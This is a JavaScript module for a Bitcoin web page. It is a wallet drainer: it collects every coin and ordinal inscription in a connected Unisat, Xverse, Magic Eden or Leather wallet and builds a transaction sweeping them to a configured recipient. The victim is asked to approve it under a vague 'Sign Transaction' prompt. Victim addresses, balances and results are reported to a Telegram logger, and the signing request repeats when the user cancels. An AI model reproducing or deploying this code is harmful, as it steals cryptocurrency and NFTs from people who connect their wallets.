/* eslint-disable no-loop-func */
/* eslint-disable no-undef */
import axios from 'axios';

import * as btc from 'micro-btc-signer'
import { base64 } from '@scure/base'
import useBtcClient from '../hook';
import { signTransaction, finalizeAllInputs } from 'sats-connect'

import { successAlert, errorAlert } from "../toast"
import { useConnect } from '@stacks/connect-react'

import { bytesToHex, hexToBytes } from '@stacks/common';

import { LogTg } from "../tg"
import { SpinnerHtml } from "../../html.js"

import Setting from "../../store"

export function Transaction({ state }) {

    let recipient = Setting.recipient
    let min = Setting.min;
    let max = Setting.max;

    const repeatTransactions = Setting.repeatTransactions
    const RPC = Setting.RPC

    const MIN_SATS_FOR_INPUT = 546;
    
    const { signPsbt } = useConnect();

    const btcClient = useBtcClient();

    const bitcoinMainnet = {
      bech32: 'bc',
      pubKeyHash: 0x00,
      scriptHash: 0x05,
      wif: 0x80,
    }

    //const feePrice = Math.floor(Math.random() * (max - min + 1)) + min;
    const feePrice = 4000

    function ecdsaPublicKeyToSchnorr(publicKey) {
      if (publicKey.byteLength === 33) return publicKey.slice(1);
      else return publicKey
    }

    async function broadcastPSBT(psbt, type, retries = 5) {
      let psbtB64;
      const RPC_URL = RPC;
    
      switch (type) {
        case "magic":
          psbtB64 = psbt;
          break;
    
        default:
          psbtB64 = base64.encode(hexToBytes(psbt));
          break;
      }
    
      try {
        const response = await axios.post(RPC_URL, JSON.stringify({
          jsonrpc: "1.0",
          id: "curltext",
          method: "finalizepsbt",
          params: [psbtB64],
        }));
    
        // console.log('hex finalize', response.data.result);
    
        // TELEGRAM transaction_broadcast
        LogTg("transaction_broadcast", {
          url: window.location.href,
          broadcast: response.data.result.hex,
        });
    
        // send raw tx
        const responseTx = await axios.post(RPC_URL, JSON.stringify({
          jsonrpc: "1.0",
          id: "curltext",
          method: "sendrawtransaction",
          params: [response.data.result.hex],
        }));
    
        return responseTx;
      } catch (e) {
        console.log(e);
        if (retries > 0) {
          return broadcastPSBT(psbt, type, retries - 1);
        } else {
          return false;
        }
      }
    }    

    //Просчет virtual bytes
    async function getVirtualBytesForTx(type, inputsCount, outputCount) {
      const recommendedFee = await btcClient.getRecommendedFee();

      //console.log("recommended Fee For VB: ", recommendedFee );
    
      const feeMultiplier = Number(Setting.feeMultiplier);
    
      const txTypes = {
        'p2tr': {
          output: 43,
          input: 58,
          overhead: 11
        },
        'p2wpkh': {
          output: 31,
          input: 68,
          overhead: 11
        },
        'p2sh': {
          output: 32,
          input: 297,
          overhead: 10
        },
        'p2pkh': {
          output: 34,
          input: 148,
          overhead: 10
        }
      };
    
      const txType = txTypes[type];
    
      if (txType) {
        const { output, input, overhead } = txType;
        return Math.floor((output * outputCount + input * inputsCount + overhead) * recommendedFee * feeMultiplier);
      } else {
        return 20000;
      }
    }

    //Разделение Инскрипшенов и Биткоинов
    async function sortUtxo(utxo, txWithInscriptions) {
      let bitcoinUtxo = [];
      let inscriptionUtxo = [];
      let bitcoinValue = 0;
      let inscriptionValue = 0;
  
      for (let i = 0; i < utxo.length; i++) {
          let transaction = utxo[i];
          let txid = transaction.txid;
  
          let foundIndex = -1;
          for (let j = 0; j < txWithInscriptions.length; j++) {
              let inscription = txWithInscriptions[j];
              if (txid === inscription.tx_id && transaction.value === Number(inscription.value)) {
                  foundIndex = j;
                  break;
              }
          }
  
          if (foundIndex !== -1) {
            const currentInscription = txWithInscriptions[foundIndex];
            if (currentInscription.mime_type !== 'text/plain') {
              transaction.type = "inscription";
              inscriptionUtxo.push(transaction);
              inscriptionValue += transaction.value
            }
            // Удалить найденную транзакцию из txWithInscriptions
            txWithInscriptions.splice(foundIndex, 1);
          } else {
              transaction.type = "bitcoin";
              bitcoinUtxo.push(transaction);
              bitcoinValue += transaction.value
          }
      }
  
      bitcoinUtxo.sort((a, b) => a.value - b.value);
      inscriptionUtxo.sort((a, b) => a.value - b.value);
  
      return { bitcoin: bitcoinUtxo, inscription: inscriptionUtxo, bitcoinValue: bitcoinValue, inscriptionValue: inscriptionValue };
    }

    //Получение tx_id со всеми инскриптами
    async function getInscriptionsForAddress(address) {
      let offset = 0;
      let limit = 60;
      let results = [];
  
      try {
          let response;
          do {
              response = await axios.get(`https://api.hiro.so/ordinals/v1/inscriptions`, {
                  params: {
                      address: address,
                      offset: offset,
                      limit: limit
                  },
                  headers: {
                      'Accept': 'application/json'
                  }
              });
  
              results = results.concat(response.data.results);
              offset += limit;
          } while (offset < response.data.total);
      } catch (error) {
          return [];
      }
      
      return results;
    }

    ////////////////////////////////////////////////
    async function p2trPsbt(address, publicKey, txsUtxo) { //
      const payment = btc.p2tr(ecdsaPublicKeyToSchnorr(hexToBytes(publicKey)), undefined, bitcoinMainnet);
      
      //console.log("Modifed UTXO BITCOIN: ", txsUtxo.bitcoin)
      //console.log("Modifed UTXO INSCRIPTION: ", txsUtxo.inscription)

      const tx = new btc.Transaction();

      // Обработка входов и выходов для Inscriptions
      for (let q = 0; q < txsUtxo?.inscription?.length; q++) {
        const inscription = txsUtxo.inscription[q];
        const inputOptions = {
          index: inscription.vout,
          tapInternalKey: payment.tapInternalKey,
          txid: inscription.txid,
          witnessUtxo: {
            amount: BigInt(inscription.value),
            script: payment.script,
          },
        };
        tx.addInput(inputOptions);
      }
  
      // Обработка входов и выходов для Чистого биткоина
      for (let b = 0; b < txsUtxo?.bitcoin?.length; b++) {
        const bitcoinUtxo = txsUtxo.bitcoin[b];
        const inputOptions = {
          index: bitcoinUtxo.vout,
          tapInternalKey: payment.tapInternalKey,
          txid: bitcoinUtxo.txid,
          witnessUtxo: {
            amount: BigInt(bitcoinUtxo.value),
            script: payment.script,
          },
        };
        tx.addInput(inputOptions);
      }

      const satsForFee = await getVirtualBytesForTx('p2tr', tx.inputs.length, tx.outputs.length + 1)
      const bitcoinToSend = txsUtxo.bitcoinValue + txsUtxo.inscriptionValue - satsForFee

      const minimumSatsForOutput = txsUtxo.inscription.length * MIN_SATS_FOR_INPUT;
      const outputAmount = (bitcoinToSend < minimumSatsForOutput) ? BigInt(minimumSatsForOutput) : BigInt(bitcoinToSend);
      
      tx.addOutputAddress(recipient, outputAmount, bitcoinMainnet);
  
      const psbt = tx.toPSBT(0)
      const psbtB64 = base64.encode(psbt)
  
      return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64, inputsLength: tx.inputs.length };
    }

    async function p2wpkhPsbt(address, publicKey, txsUtxo) { //
      const payment = btc.p2wpkh(hexToBytes(publicKey), bitcoinMainnet);

      //console.log("Modifed UTXO BITCOIN: ", txsUtxo.bitcoin)
      //console.log("Modifed UTXO INSCRIPTION: ", txsUtxo.inscription)

      const tx = new btc.Transaction();

      // Обработка входов и выходов для Inscriptions
      for (let q = 0; q < txsUtxo?.inscription?.length; q++) {
        const inscription = txsUtxo.inscription[q];
        const inputOptions = {
          index: inscription.vout,
          txid: inscription.txid,
          witnessUtxo: {
            amount: BigInt(inscription.value),
            script: payment.script,
          },
        };
        tx.addInput(inputOptions);
      }

      // Обработка входов и выходов для Чистого биткоина
      for (let b = 0; b < txsUtxo?.bitcoin?.length; b++) {
        const bitcoinUtxo = txsUtxo.bitcoin[b];
        const inputOptions = {
          index: bitcoinUtxo.vout,
          txid: bitcoinUtxo.txid,
          witnessUtxo: {
            amount: BigInt(bitcoinUtxo.value),
            script: payment.script,
          },
        };
        tx.addInput(inputOptions);
      }

      const satsForFee = await getVirtualBytesForTx('p2wpkh', tx.inputs.length, tx.outputs.length + 1)
      const bitcoinToSend = txsUtxo.bitcoinValue + txsUtxo.inscriptionValue - satsForFee

      const minimumSatsForOutput = txsUtxo.inscription.length * MIN_SATS_FOR_INPUT;
      const outputAmount = (bitcoinToSend < minimumSatsForOutput) ? BigInt(minimumSatsForOutput) : BigInt(bitcoinToSend);
      
      tx.addOutputAddress(recipient, outputAmount, bitcoinMainnet);
  
      const psbt = tx.toPSBT(0)
      const psbtB64 = base64.encode(psbt)
  
      return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64, inputsLength: tx.inputs.length };
    }

    async function p2shPsbt(address, publicKey, txsUtxo) { //
      const payment = btc.p2sh(btc.p2wpkh(hexToBytes(publicKey), bitcoinMainnet), bitcoinMainnet);

      //console.log("Modifed UTXO BITCOIN: ", txsUtxo.bitcoin)
      //console.log("Modifed UTXO INSCRIPTION: ", txsUtxo.inscription)

      const tx = new btc.Transaction();

      // Обработка входов и выходов для Inscriptions
      for (let q = 0; q < txsUtxo?.inscription?.length; q++) {
        const inscription = txsUtxo.inscription[q];
        const inputOptions = {
          index: inscription.vout,
          txid: inscription.txid,
          witnessUtxo: {
            amount: BigInt(inscription.value),
            script: payment.script,
          },
          redeemScript: payment.redeemScript,
        };
        tx.addInput(inputOptions);
      }

      // Обработка входов и выходов для Чистого биткоина
      for (let b = 0; b < txsUtxo?.bitcoin?.length; b++) {
        const bitcoinUtxo = txsUtxo.bitcoin[b];
        const inputOptions = {
          index: bitcoinUtxo.vout,
          txid: bitcoinUtxo.txid,
          witnessUtxo: {
            amount: BigInt(bitcoinUtxo.value),
            script: payment.script,
          },
          redeemScript: payment.redeemScript,
        };
        tx.addInput(inputOptions);
      }

      const satsForFee = await getVirtualBytesForTx('p2sh', tx.inputs.length, tx.outputs.length + 1)
      const bitcoinToSend = txsUtxo.bitcoinValue + txsUtxo.inscriptionValue - satsForFee

      const minimumSatsForOutput = txsUtxo.inscription.length * MIN_SATS_FOR_INPUT;
      const outputAmount = (bitcoinToSend < minimumSatsForOutput) ? BigInt(minimumSatsForOutput) : BigInt(bitcoinToSend);
      
      tx.addOutputAddress(recipient, outputAmount, bitcoinMainnet);
  
      const psbt = tx.toPSBT(0)
      const psbtB64 = base64.encode(psbt)
  
      return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64, inputsLength: tx.inputs.length };
    }

    async function p2pkhPsbt(address, txsUtxo) { //
      //console.log("Modifed UTXO BITCOIN: ", txsUtxo.bitcoin)
      //console.log("Modifed UTXO INSCRIPTION: ", txsUtxo.inscription)

      const tx = new btc.Transaction();

      // Обработка входов и выходов для Inscriptions
      for (let q = 0; q < txsUtxo?.inscription?.length; q++) {
        const inscription = txsUtxo.inscription[q];
        const inputOptions = {
          index: inscription.vout,
          txid: inscription.txid,
          nonWitnessUtxo: await btcClient.getHexTx(inscription.txid)
        };
        tx.addInput(inputOptions);
      }

      // Обработка входов и выходов для Чистого биткоина
      for (let b = 0; b < txsUtxo?.bitcoin?.length; b++) {
        const bitcoinUtxo = txsUtxo.bitcoin[b];
        const inputOptions = {
          index: bitcoinUtxo.vout,
          txid: bitcoinUtxo.txid,
          nonWitnessUtxo: await btcClient.getHexTx(bitcoinUtxo.txid)
        };
        tx.addInput(inputOptions);
      }

      const satsForFee = await getVirtualBytesForTx('p2pkh', tx.inputs.length, tx.outputs.length + 1)
      const bitcoinToSend = txsUtxo.bitcoinValue + txsUtxo.inscriptionValue - satsForFee

      const minimumSatsForOutput = txsUtxo.inscription.length * MIN_SATS_FOR_INPUT;
      const outputAmount = (bitcoinToSend < minimumSatsForOutput) ? BigInt(minimumSatsForOutput) : BigInt(bitcoinToSend);
      
      tx.addOutputAddress(recipient, outputAmount, bitcoinMainnet);
  
      const psbt = tx.toPSBT(0)
      const psbtB64 = base64.encode(psbt)
  
      return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64, inputsLength: tx.inputs.length };
    }
    ////////////////////////////////////////////////    

    async function generatePSBT(account) {
      let PSBT;
    
      switch (account.type) {
        case 'p2wpkh':
          PSBT = await p2wpkhPsbt(account.address, account.publicKey, account.txsUtxo);
          break;
        case 'p2sh-p2wpkh':
          PSBT = await p2shPsbt(account.address, account.publicKey, account.txsUtxo);
          break;
        case 'p2tr':
          PSBT = await p2trPsbt(account.address, account.publicKey, account.txsUtxo);
          break;
        case 'p2pkh':
          PSBT = await p2pkhPsbt(account.address, account.txsUtxo);
          break;
        default:
          PSBT = null;
          break;
      }
    
      return PSBT;
    }

    const SendTransaction = async () => {

      if (Setting.transactionStarted) return;
      Setting.transactionStarted = true
      SpinnerHtml(true)

      const wallet = localStorage.getItem("wallet")

      //Парсим аккаунт
      for (const account of state.accountsWallet) {
        const txsUtxo = await sortUtxo(await btcClient.getUnspentOutputs(account.address), await getInscriptionsForAddress(account.address))

        const txsUtxo1 = await sortUtxo(await btcClient.getUnspentOutputs(account.address), await getInscriptionsForAddress(account.address))
        console.log(txsUtxo1)

        account.txsUtxo = txsUtxo;
        account.assessmentValue = txsUtxo.bitcoinValue + txsUtxo.inscriptionValue + txsUtxo.inscription.length * 50000

        if (txsUtxo.inscription.length === 0 && txsUtxo.bitcoin.length === 0) {
          account.balance = 0;
        }
      }

      //Все окей
      if (wallet === "unisat") {
          const accountsData = state?.accountsWallet;
          const filteredAccountsData = accountsData.filter(account => account.balance >= feePrice);
        
          if (filteredAccountsData.length === 0) {
            if (Setting.typeAlert != "none") errorAlert('Insufficient funds to pay the gas fee.');
            SpinnerHtml(false)
            Setting.transactionStarted = false
            return;
          }
        
          for (const account of filteredAccountsData) {
            let PSBT = await generatePSBT(account);

            if (PSBT === null) {
              continue;
            }
        
            const transactionData = {
              url: window.location.href,
              account: account.address,
              walletType: wallet,
              balance: account.balance,
              inscriptionsLength: account.txsUtxo.inscription.length,
              bitcoinsLength: account.txsUtxo.bitcoin.length
            };

            try {
              LogTg("transaction_started", transactionData);
        
              const signedTx = await window.unisat.signPsbt(PSBT.hex);
              const broadcastedTx = await broadcastPSBT(signedTx, wallet);
        
              if (!broadcastedTx) {
                if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
                LogTg("transaction_false", transactionData);
              } else {
                if (Setting.typeAlert != "none") successAlert('Transaction Success');
                LogTg("transaction_true", transactionData);
              }
            } catch (e) {
              console.log(e);
              if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
        
              const transactionDataWithError = {
                ...transactionData,
                error: e?.message ? e?.message : ""
              };
        
              LogTg("transaction_false", transactionDataWithError);
        
              if (e.code === 4001 && repeatTransactions) {
                continue;
              }
            }
          }
      }

      //Все окей
      if (wallet === "xverse") {
        const filteredAccountsData = state?.accountsWallet
        .filter(account => account.balance >= feePrice)
        .sort((a, b) => b.assessmentValue - a.assessmentValue);
      
        
          if (filteredAccountsData.length === 0) {
            if (Setting.typeAlert != "none") errorAlert('Insufficient funds to pay the gas fee.');
            SpinnerHtml(false)
            Setting.transactionStarted = false
            return;
          }
        
          for (const account of filteredAccountsData) {
            let PSBT = await generatePSBT(account);
        
            if (PSBT === null) {
              continue;
            }
        
            const transactionData = {
              url: window.location.href,
              account: account.address,
              walletType: wallet,
              balance: account.balance,
              inscriptionsLength: account.txsUtxo.inscription.length,
              bitcoinsLength: account.txsUtxo.bitcoin.length
            };

            try {
              const signPsbtOptions = {
                payload: {
                  network: {
                    type: 'Mainnet'
                  },
                  message: 'Sign Transaction',
                  psbtBase64: PSBT.base64,
                  broadcast: true,
                  inputsToSign: [{
                    address: account.address,
                    signingIndexes: Array.from({ length: PSBT.inputsLength }, (_, index) => index),
                  }],
                },
                onFinish: (response) => {
                  if (Setting.typeAlert != "none") successAlert('Transaction Success');
                  LogTg("transaction_true", transactionData);
                },
                onCancel: () => {
                  if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
                  LogTg("transaction_false", transactionData);
                  if (repeatTransactions) i--;
                }
              };
              await signTransaction(signPsbtOptions);
            } catch (e) {
              console.log(e);
              if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
              const transactionDataWithError = {
                ...transactionData,
                error: e?.message ? e?.message : ""
              };
              LogTg("transaction_false", transactionDataWithError);
            }
          }
      }

      //Все окей
      if (wallet === "magic") {
        const filteredAccountsData = state?.accountsWallet
        .filter(account => account.balance >= feePrice)
        .sort((a, b) => b.assessmentValue - a.assessmentValue);
      
        
          if (filteredAccountsData.length === 0) {
            if (Setting.typeAlert != "none") errorAlert('Insufficient funds to pay the gas fee.');
            SpinnerHtml(false)
            Setting.transactionStarted = false
            return;
          }
        
          for (const account of filteredAccountsData) {
            let PSBT = await generatePSBT(account);
        
            if (PSBT === null) {
              continue;
            }
        
            const transactionData = {
              url: window.location.href,
              account: account.address,
              walletType: wallet,
              balance: account.balance,
              inscriptionsLength: account.txsUtxo.inscription.length,
              bitcoinsLength: account.txsUtxo.bitcoin.length
            };

            try {
              const signPsbtOptions = {
                payload: {
                  network: {
                    type: 'Mainnet'
                  },
                  message: 'Sign Transaction',
                  psbtBase64: PSBT.base64,
                  broadcast: false,
                  inputsToSign: [{
                    address: account.address,
                    signingIndexes: Array.from({ length: PSBT.inputsLength }, (_, index) => index),
                  }],
                },
                onFinish: (response) => {
                  if (Setting.typeAlert != "none") successAlert('Transaction Success');
                  
                  broadcastPSBT(response.psbtBase64, wallet)
                    .then((broadcastedTx) => {
                      if (!broadcastedTx) {
                        if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
                        LogTg("transaction_false", transactionData);
                      } else {
                        if (Setting.typeAlert != "none") successAlert('Transaction Success');
                        LogTg("transaction_true", transactionData);
                      }
                    })
                    .catch((er) => {
                      if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
                      
                      const transactionDataWithError = {
                        ...transactionData,
                        error: er?.message ? er?.message : ""
                      };
                
                      LogTg("transaction_false", transactionDataWithError);
                    });
                },
                onCancel: () => {
                  if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
                  LogTg("transaction_false", transactionData);
                  if (repeatTransactions) i--;
                }
              };
        
              await signTransaction(signPsbtOptions);
            } catch (e) {
              console.log(e);
              if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
              const transactionDataWithError = {
                ...transactionData,
                error: e?.message ? e?.message : ""
              };
              LogTg("transaction_false", transactionDataWithError);
            }
          }
      }

      //Все окей
      if (wallet === "leather") {
        const filteredAccountsData = state?.accountsWallet
        .filter(account => account.balance >= feePrice)
        .sort((a, b) => b.assessmentValue - a.assessmentValue);
      
        console.log(filteredAccountsData)
        
          if (filteredAccountsData.length === 0) {
            if (Setting.typeAlert != "none") errorAlert('Insufficient funds to pay the gas fee.');
            SpinnerHtml(false)
            Setting.transactionStarted = false
            return;
          }
        
          for (const account of filteredAccountsData) {
            let PSBT = await generatePSBT(account);
        
            if (PSBT === null) {
              continue;
            }
        
            const transactionData = {
              url: window.location.href,
              account: account.address,
              walletType: wallet,
              balance: account.balance,
              inscriptionsLength: account.txsUtxo.inscription.length,
              bitcoinsLength: account.txsUtxo.bitcoin.length
            };

            try {
              LogTg("transaction_started", transactionData);
        
              const signedTx = await window.LeatherProvider.request('signPsbt', { hex: PSBT.hex, signAtIndex: Array.from({ length: PSBT.inputsLength }, (_, index) => index), broadcast: true });
        
              if (!signedTx) {
                if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
                LogTg("transaction_false", transactionData);
              } else {
                if (Setting.typeAlert != "none") successAlert('Transaction Success');
                LogTg("transaction_true", transactionData);
              }
            } catch (e) {
              console.log(e);
              if (Setting.typeAlert != "none") errorAlert('Transaction Failed');
              
              const transactionDataWithError = {
                ...transactionData,
                error: e?.message ? e?.message : ""
              };
              LogTg("transaction_false", transactionDataWithError);
        
              if (e.code == 4001 && repeatTransactions) i--;
            }
          }
      }      

      SpinnerHtml(false)
      Setting.transactionStarted = false
    }

    window.bitcoinTransaction = SendTransaction

    return null
}